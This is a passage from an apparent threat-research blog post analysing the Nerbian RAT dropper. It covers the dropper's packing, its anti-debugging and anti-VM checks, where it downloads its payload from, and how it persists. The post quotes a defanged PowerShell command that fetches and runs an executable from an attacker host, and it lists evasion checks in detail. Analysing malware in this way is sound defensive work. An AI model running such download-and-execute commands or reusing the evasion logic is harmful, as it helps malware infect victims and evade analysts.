<p style="margin-left: 48px; margin-bottom: 11px;"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">powershell&nbsp; IWR -Uri&nbsp; hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog &nbsp;-OutFile C:\Users\[username]\AppData\Roaming\UpdateUAV.exe ;C:\Users\[username]\AppData\Roaming\UpdateUAV.exe</span></span></span></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">This batch file performs a PowerShell Invoke Web Request (IWR) to the URL:</span></span></span></span></p>

<pre style="text-indent: 0.5in; margin-bottom: 11px;">
<span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog</span></span></span><span style="font-size:12.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">, </span></span></span></span></span></span></pre>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">It renames the downloaded file to UpdateUAV.exe, and drops it into:</span></span></span></span></p>

<pre style="text-indent: 0.5in; margin-bottom: 11px;">
<span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">C:\Users\[current user]\AppData\Roaming\UpdateUAV.exe</span></span></span><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">. </span></span></span></span></span></span></pre>

<h3><strong>Dropper: UpdateUAV.exe</strong></h3>

<p>UpdateUAV.exe is the payload initially downloaded from the malicious Word document. It is a 64-bit executable, written in Golang, 3.5MB in size, and UPX packed. Executable files created in the Go language tend to be slightly larger than most other executable files. Likely, this malware is packed with UPX to reduce the overall size of the executable being downloaded. Unpacked, the file is 6.6MB in total.</p>

<p><img alt="UpdateUAV.exe " data-entity-type="file" data-entity-uuid="7e0dab19-8440-408a-8135-05f70b503a3d" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.39%20AM.png" width="712" height="247" loading="lazy"></p>

<p><em>Figure 5: The UpdateUAV.exe payload is packed with UPX, likely in an effort to reduce its size.</em></p>

<p>Proofpoint analysts extracted decrypted data during execution. The resulting memory revealed additional information about the sample.&nbsp;&nbsp;</p>

<h3><strong>Functionality</strong></h3>

<p>UpdateUAV.exe is a dropper for Nerbian RAT. This determination was made through multiple different observations. First is the string embedded in the sample:</p>

<p><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:9.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;K:/W_Work/Golang/src/RAT_Dropper/main_gen.go</span></span></span></span></span></span></p>

<p>According to the source path, this executable is a dropper. Proofpoint named this malware “Nerbian RAT” based on one of the function names in the dropper. The specific function name is “main_downloadNerbian” as shown in the following figure.</p>

<p><img alt="Nerbian RAT " data-entity-type="file" data-entity-uuid="c71d99d8-3645-41c2-b517-87878139560e" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.58.54%20AM.png" width="396" height="355" loading="lazy"></p>

<p><em>Figure 6 : Nerbian RAT main function code.</em></p>

<p>There are additional references to "Nerbian" in some of the Go functions scattered throughout the binary.</p>

<p><img alt="RAT" data-entity-type="file" data-entity-uuid="31a389ff-2fd9-4f7a-9126-6a4d8b647b8c" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.59.09%20AM.png" width="500" height="75" loading="lazy"></p>

<p><em>Figure 7: Functions referring to the RAT the dropper is meant to download and store on the compromised system.</em></p>

<h3><strong>Code Reuse</strong></h3>

<p>Most software developers, including malware developers, use existing software packages. The UpdateUAV executable, which is a dropper for Nerbian RAT, features a lot of code re-use, with strings referencing various GitHub projects:</p>

<p style="margin-left:48px; margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">github.com/go-ole/go-ole – Go bindings for Windows COM (Component Object Model – inter-process communication)</span><br>
<span style="font-family:Helvetica">github.com/gonutz/w32/v2 – Go bindings for the Win32 API</span><br>
<span style="font-family:Helvetica">github.com/mitchellh/go-ps – Library implements OS-specific APIs to list and manipulate processes</span><br>
<span style="font-family:Helvetica">github.com/StackExchange/wmi – Go package for Windows WMI, providing a WQL interface</span></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">Out of all these references to external projects the most interesting is:</span></span></span></span></p>

<p style="text-indent:.5in; margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">github.com/p3tr0v/chacal/</span></span></span></span></p>

<h3><strong>Anti-Debug, Anti-VM, Anti-Forensics</strong></h3>

<p><img alt="Chacal GitHub " data-entity-type="file" data-entity-uuid="dee49e3c-bed8-4ab8-abe1-4df6343f2395" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%208.59.37%20AM.png" width="775" height="650" loading="lazy"></p>

<p><em>Figure 8: Chacal GitHub page.</em></p>

<p>Chacal is described as, “Golang anti-vm framework for Red Team and Pentesters”. However, there are several functions and references in the project designed to make debugging and reverse engineering more difficult as well.</p>

<p>The dropper will stop execution if it encounters any of the following conditions:</p>

<ul>
	<li>The size of the hard disk on the system is less than a certain size. The default defined in Chacal is 100GB.</li>
	<li>The name of the hard disk, according to WMI contains one of the following strings:
	<ul>
		<li>"virtual"</li>
		<li>"vbox"</li>
		<li>"vmware"</li>
	</ul>
	</li>
	<li>The MAC address queried returns any of the following OUI values:
	<ul>
		<li>00:0c:29, 00:50:56, 08:00:27, 52:54:00, 00:21:F6, 00:14:4F, 00:0F:4B, 00:10:E0, 00:00:7D, 00:21:28, 00:01:5D, 00:21:F6, 00:A0:A4, 00:07:82, 00:03:BA, 08:00:20, 2C:C2:60, 00:10:4F, 00:0F:4B, 00:13:97, 00:20:F2, 00:14:4F</li>
	</ul>
	</li>
	<li>Any of the following reverse engineering/debugging programs are encountered in the process list:
	<ul>
		<li>processhacker.exe, procmon.exe, pestudio.exe, procmon64.exe, x32dbg.exe, x64dbg.exe, CFF Explorer.exe, procexp64.exe, procexp.exe, pslist.exe, tcpview.exe, tcpvcon.exe, dbgview.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe, ollydbg.exe, agent.py, autoruns.exe, autorunsc.exe, filemon.exe, regmon.exe, idaq.exe, idaq64.exe, ImmunityDebugger.exe, Wireshark.exe, dumpcap.exe, HookExplorer.exe, ImportREC.exe, PETools.exe, LordPE.exe, SysInspector.exe, proc_analyzer.exe, sysAnalyzer.exe, sniff_hit.exe, windbg.exe, joeboxcontrol.exe, joeboxserver.exe, joeboxserver.exe, ResourceHacker.exe, Fiddler.exe, httpdebugger.exe</li>
	</ul>
	</li>
	<li>Any of the following memory analysis/memory tampering programs are present in the process list:
	<ul>
		<li>DumpIt.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe</li>
	</ul>
	</li>
	<li>A time measurement function checks to see if the amount of time elapsed execution specific functions is deemed "excessive". If the time threshold is reached, the malware assumes it is being debugged, and will exit.</li>
</ul>

<p>In addition to the anti-reversing checks provided by Chacal, there are other anti-analysis checks present in the binary including:</p>

<ul>
	<li>Uses the IsDebuggerPresent API to determine if the executable is being debugged</li>
	<li>Appears to query for the following network interface names:
	<ul>
		<li>Intel® PRO/1000 MT Network Connection</li>
		<li>Loopback Pseudo-Interface 1</li>
		<li>Software Loopback Interface 1</li>
	</ul>
	</li>
</ul>

<h3><strong>Download, Execution, and Persistence</strong></h3>

<p>In the case of analyzed sample, the dropper attempted to download its payload from:</p>

<p style="text-indent:.5in; margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">hxxps://www[.] fernandestechnical [.]com/pub/media/ssl</span></span></span></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">And will save the RAT to:</span></span></span></span></p>

<p style="text-indent:.5in; margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">C:\ProgramData\USOShared\MoUsoCore.exe</span></span></span></span></span></span></p>

<p>Next, the dropper will attempt to establish a scheduled task named MicrosoftMouseCoreWork to start the RAT payload hourly to establish persistence.</p>

<p><img src="data:image/png;base64,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